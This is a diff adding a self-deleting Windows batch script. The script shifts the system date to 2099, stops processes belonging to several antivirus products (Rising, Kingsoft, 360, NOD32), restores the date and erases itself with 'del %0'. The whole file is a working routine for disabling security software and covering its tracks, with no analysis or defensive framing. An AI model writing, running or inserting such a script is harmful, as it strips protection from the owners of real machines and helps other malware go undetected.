@@ -1,0 +1,27 @@
+@ECHO OFF
+@date /t>C:\time.txt
+date 2099-03-20
+
+ping 127.0.0.1
+ping 127.0.0.1
+ping 127.0.0.1
+ping 127.0.0.1
+ping 127.0.0.1
+ping 127.0.0.1
+ping 127.0.0.1
+
+net stop RavMon.exe
+net stop kavstart.exe
+net stop kissvc.exe
+net stop kwatch.exe
+net stop 360tray.exe
+net stop 360safe.exe
+net stop nod32kui.exe
+net stop nod32krn.exe
+
+@date <C:\time.txt 
+ping 127.0.0.1
+
+del C:\time.txt
+del %0
+
